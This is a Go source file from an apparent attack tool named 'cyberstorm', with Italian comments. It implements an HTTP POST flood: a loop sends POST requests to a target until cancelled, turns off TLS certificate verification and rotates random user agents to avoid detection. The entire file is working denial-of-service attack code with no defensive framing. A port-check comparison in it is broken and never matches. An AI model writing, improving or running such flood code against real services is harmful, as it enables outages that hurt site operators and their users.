package attacks

import (
	"context"
	"crypto/tls"
	"log"
	"net/http"
	"strings"
	"sync"

	"cyberstorm/core"
)

// SendHTTPPost invia richieste HTTP POST in un ciclo finché il contesto non viene cancellato
func SendHTTPPost(target string, body string, userAgent string, wg *sync.WaitGroup, ctx context.Context) {
	defer wg.Done()

	// Aggiunge http:// o https:// al target in base alla porta
	if target[:4] != "http" {
		if target[:4] == "443" {
			target = "https://" + target
		} else {
			target = "http://" + target
		}
	}

	// Ignora i certificati non validi (per HTTPS)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{}

	for {
		select {
		case <-ctx.Done():
			log.Println("HTTP POST flood interrotto.")
			return
		default:
			// Se non è specificato un User-Agent, scegliamo uno casuale
			if userAgent == "" {
				userAgent = core.GetRandomUserAgent()
			}

			// Crea la richiesta HTTP POST
			req, err := http.NewRequest("POST", target, strings.NewReader(body))
			if err != nil {
				log.Printf("Errore nella creazione della richiesta HTTP POST: %v", err)
				continue
			}

			// Imposta il User-Agent
			req.Header.Set("User-Agent", userAgent)
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			// Esegue la richiesta
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Errore nella richiesta HTTP POST: %v", err)
				continue
			}
			resp.Body.Close()
		}
	}
}
